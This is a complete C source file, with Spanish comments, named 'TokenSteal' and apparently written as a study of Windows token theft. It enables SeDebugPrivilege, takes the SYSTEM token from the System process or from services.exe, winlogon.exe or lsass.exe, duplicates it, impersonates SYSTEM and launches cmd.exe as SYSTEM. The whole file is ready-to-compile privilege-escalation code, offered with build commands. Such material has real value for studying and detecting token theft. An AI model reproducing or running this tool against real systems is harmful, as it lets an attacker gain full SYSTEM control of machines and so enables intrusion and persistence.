/*
 * TokenSteal - Windows user-mode token study
 * Autor: Eduardo Romera Martínez
 * Uso: laboratorio propio y sistemas autorizados.
 *
 * Compilar con MinGW:
 *   gcc tokensteal.c -o tokensteal.exe -ladvapi32
 *
 * Compilar con MSVC:
 *   cl /W4 tokensteal.c advapi32.lib
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <sddl.h>

static void PrintWinError(const char *msg, DWORD err)
{
    LPSTR buf = NULL;
    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, err,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&buf, 0, NULL);

    printf("[-] %s: %lu", msg, err);
    if (buf) { printf(" (%s)", buf); LocalFree(buf); }
    printf("\n");
}

static BOOL EnablePrivilege(const char *privName)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    BOOL ok = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                          &hToken))
    {
        PrintWinError("OpenProcessToken (propio) fallo", GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValueA(NULL, privName, &luid))
    {
        printf("[-] %s: no se pudo resolver el LUID (err %lu)\n",
               privName, GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    {
        DWORD need = 0;
        GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &need);
        if (need > 0)
        {
            PTOKEN_PRIVILEGES p = (PTOKEN_PRIVILEGES)malloc(need);
            if (p && GetTokenInformation(hToken, TokenPrivileges, p, need, &need))
            {
                int encontrado = 0;
                for (DWORD i = 0; i < p->PrivilegeCount; i++)
                {
                    if (memcmp(&p->Privileges[i].Luid, &luid, sizeof(LUID)) == 0)
                    {
                        DWORD a = p->Privileges[i].Attributes;
                        if (a & SE_PRIVILEGE_REMOVED)
                        {
                            printf("[-] %s: presente pero SE_PRIVILEGE_REMOVED "
                                   "(no se puede habilitar).\n", privName);
                            printf("    Token filtrado por UAC -> ejecuta 'como administrador'.\n");
                        }
                        else if (a & SE_PRIVILEGE_ENABLED)
                            printf("[i] %s: ya habilitado.\n", privName);
                        else
                            printf("[i] %s: presente pero DESHABILITADO -> habilitando...\n",
                                   privName);
                        encontrado = 1;
                        break;
                    }
                }
                if (!encontrado)
                    printf("[!] %s: no esta en el token actual.\n", privName);
            }
            free(p);
        }
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL))
    {
        printf("[-] %s: AdjustTokenPrivileges fallo (err %lu)\n",
               privName, GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    DWORD err = GetLastError();
    if (err == ERROR_NOT_ALL_ASSIGNED)
    {
        printf("[-] %s: NO se pudo habilitar (removido/filtrado).\n", privName);
    }
    else if (err == ERROR_SUCCESS)
    {
        printf("[+] %s: HABILITADO.\n", privName);
        ok = TRUE;
    }
    else
    {
        printf("[-] %s: error inesperado (err %lu)\n", privName, err);
    }

    CloseHandle(hToken);
    return ok;
}

static BOOL EnableRequiredPrivileges(void)
{
    printf("\n[*] Habilitando privilegios necesarios...\n");

    BOOL seDebug       = EnablePrivilege(SE_DEBUG_NAME);
    BOOL seImpersonate = EnablePrivilege(SE_IMPERSONATE_NAME);
    BOOL seAssign      = EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME);
    BOOL seQuota       = EnablePrivilege(SE_INCREASE_QUOTA_NAME);

    printf("[*] Resumen: SeDebug=%s SeImpersonate=%s SeAssignPrimary=%s SeIncreaseQuota=%s\n",
           seDebug ? "OK" : "FALLO",
           seImpersonate ? "OK" : "FALLO",
           seAssign ? "OK" : "FALLO",
           seQuota ? "OK" : "FALLO");

    if (!seDebug)
    {
        printf("[-] Sin SeDebugPrivilege no se puede abrir el token de SYSTEM. Abortando.\n");
        return FALSE;
    }
    return TRUE;
}

static DWORD FindProcessByName(const char *name)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (Process32First(hSnap, &pe))
    {
        do
        {
            if (_stricmp(pe.szExeFile, name) == 0)
            {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return pid;
}

static BOOL TryGetSystemToken(DWORD pid, const char *name, HANDLE *outToken)
{
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc)
    {
        DWORD err = GetLastError();
        if (err == ERROR_ACCESS_DENIED)
            printf("[!] %s (PID %lu): ACCESS_DENIED (posible PPL/protegido). Saltando...\n",
                   name, pid);
        else
            PrintWinError("OpenProcess", err);
        return FALSE;
    }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProc,
                          TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
                          &hToken))
    {
        DWORD err = GetLastError();
        if (err == ERROR_ACCESS_DENIED)
            printf("[!] %s (PID %lu): token ACCESS_DENIED (posible PPL). Saltando...\n",
                   name, pid);
        else
            PrintWinError("OpenProcessToken", err);
        CloseHandle(hProc);
        return FALSE;
    }

    CloseHandle(hProc);
    *outToken = hToken;
    printf("[+] Token de SYSTEM obtenido desde %s (PID %lu)\n", name, pid);
    return TRUE;
}

static HANDLE ObtainSystemToken(void)
{
    HANDLE tok = NULL;

    if (TryGetSystemToken(4, "System", &tok))
        return tok;

    const char *nombres[] = {
        "services.exe",
        "spoolsv.exe",
        "winlogon.exe",
        "lsass.exe",
    };

    for (int i = 0; i < 4; i++)
    {
        DWORD pid = FindProcessByName(nombres[i]);
        if (pid == 0)
        {
            printf("[!] %s no encontrado en la lista de procesos.\n", nombres[i]);
            continue;
        }
        if (TryGetSystemToken(pid, nombres[i], &tok))
            return tok;
    }

    return NULL;
}

static void PrintTokenUser(HANDLE hToken)
{
    DWORD len = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &len);
    if (len == 0) { printf("[?] User SID: n/a\n"); return; }

    PTOKEN_USER u = (PTOKEN_USER)malloc(len);
    if (!GetTokenInformation(hToken, TokenUser, u, len, &len))
    {
        free(u);
        return;
    }

    LPSTR sidStr = NULL;
    if (ConvertSidToStringSidA(u->User.Sid, &sidStr))
    {
        printf("[+] User SID: %s\n", sidStr);
        LocalFree(sidStr);
    }
    free(u);
}

static void PrintIntegrity(HANDLE hToken)
{
    DWORD len = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &len);
    if (len == 0) { printf("[?] IntegrityLevel: n/a\n"); return; }

    PTOKEN_MANDATORY_LABEL label = (PTOKEN_MANDATORY_LABEL)malloc(len);
    if (!GetTokenInformation(hToken, TokenIntegrityLevel, label, len, &len))
    {
        free(label);
        return;
    }

    DWORD subCount = *GetSidSubAuthorityCount(label->Label.Sid);
    DWORD rid = *(GetSidSubAuthority(label->Label.Sid, subCount - 1));

    const char *nombre;
    switch (rid)
    {
        case 0x1000: nombre = "Low";                 break;
        case 0x2000: nombre = "Medium";              break;
        case 0x3000: nombre = "High";                break;
        case 0x4000: nombre = "System";              break;
        case 0x5000: nombre = "Protected Process";   break;
        default:     nombre = "Desconocido";         break;
    }
    printf("[+] IntegrityLevel: %s (RID 0x%04lX)\n", nombre, rid);
    free(label);
}

static void PrintEnabledPrivileges(HANDLE hToken)
{
    DWORD len = 0;
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &len);
    if (len == 0) { printf("[?] Privilegios: n/a\n"); return; }

    PTOKEN_PRIVILEGES privs = (PTOKEN_PRIVILEGES)malloc(len);
    if (!GetTokenInformation(hToken, TokenPrivileges, privs, len, &len))
    {
        printf("[?] No se pudieron leer privilegios (err %lu)\n", GetLastError());
        free(privs);
        return;
    }

    printf("[+] Privilegios habilitados (%lu totales):\n", privs->PrivilegeCount);
    int mostrados = 0;

    for (DWORD i = 0; i < privs->PrivilegeCount; i++)
    {
        if (!(privs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED))
            continue;

        char nombre[256];
        DWORD cch = sizeof(nombre);
        if (LookupPrivilegeNameA(NULL, &privs->Privileges[i].Luid, nombre, &cch))
        {
            printf("      - %s\n", nombre);
            mostrados++;
        }
    }

    if (mostrados == 0)
        printf("      (ninguno habilitado)\n");

    free(privs);
}

static void PrintTokenInfo(HANDLE hToken, const char *etiqueta)
{
    printf("\n===== %s =====\n", etiqueta);
    PrintTokenUser(hToken);
    PrintIntegrity(hToken);

    TOKEN_STATISTICS stats;
    DWORD len = 0;
    if (GetTokenInformation(hToken, TokenStatistics, &stats, sizeof(stats), &len))
    {
        printf("[+] TokenType: %s\n",
               stats.TokenType == TokenPrimary ? "Primary" : "Impersonation");
        printf("[+] ImpersonationLevel: %lu (2=SecurityImpersonation)\n",
               stats.ImpersonationLevel);
    }

    PrintEnabledPrivileges(hToken);
    printf("===========================\n");
}

int main(void)
{
    printf("=== Token Stealing user-mode (estudio) ===\n");
    printf("[*] Requiere ejecucion como Administrador elevado.\n");

    HANDLE hSelf = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hSelf))
    {
        PrintWinError("No se pudo abrir el token del proceso actual", GetLastError());
        return 1;
    }
    PrintTokenInfo(hSelf, "TOKEN ACTUAL (antes)");
    CloseHandle(hSelf);

    if (!EnableRequiredPrivileges())
        return 1;

    HANDLE hSysToken = ObtainSystemToken();
    if (!hSysToken)
    {
        printf("[-] No se pudo obtener el token de SYSTEM desde ningun candidato.\n");
        printf("[-] Verifica que estas en una consola elevada y que SeDebug=OK.\n");
        return 1;
    }

    HANDLE hDup = NULL;
    if (!DuplicateTokenEx(hSysToken,
                          TOKEN_ALL_ACCESS,
                          NULL,
                          SecurityImpersonation,
                          TokenPrimary,
                          &hDup))
    {
        PrintWinError("DuplicateTokenEx fallo", GetLastError());
        CloseHandle(hSysToken);
        return 1;
    }
    printf("[+] Token duplicado como PRIMARIO\n");

    if (ImpersonateLoggedOnUser(hDup))
    {
        printf("[+] El hilo actual ahora suplanta (impersona) a SYSTEM\n");
    }
    else
    {
        PrintWinError("ImpersonateLoggedOnUser fallo (no fatal)", GetLastError());
    }

    HANDLE hEff = NULL;
    if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hEff))
    {
        PrintTokenInfo(hEff, "TOKEN EFECTIVO DEL HILO (despues)");
        CloseHandle(hEff);
    }
    else
    {
        PrintWinError("OpenThreadToken fallo, mostrando token duplicado", GetLastError());
        PrintTokenInfo(hDup, "TOKEN DUPLICADO (despues)");
    }

    printf("\n[*] Lanzando cmd.exe como SYSTEM...\n");

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    wchar_t cmdline[] = L"cmd.exe";

    if (CreateProcessWithTokenW(hDup,
                                LOGON_WITH_PROFILE,
                                NULL,
                                cmdline,
                                0,
                                NULL, NULL,
                                &si, &pi))
    {
        printf("[+] cmd.exe SYSTEM lanzado (PID %lu)\n", pi.dwProcessId);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    else
    {
        PrintWinError("CreateProcessWithTokenW fallo", GetLastError());
    }

    CloseHandle(hDup);
    CloseHandle(hSysToken);

    printf("\n[*] Terminado.\n");
    return 0;
}
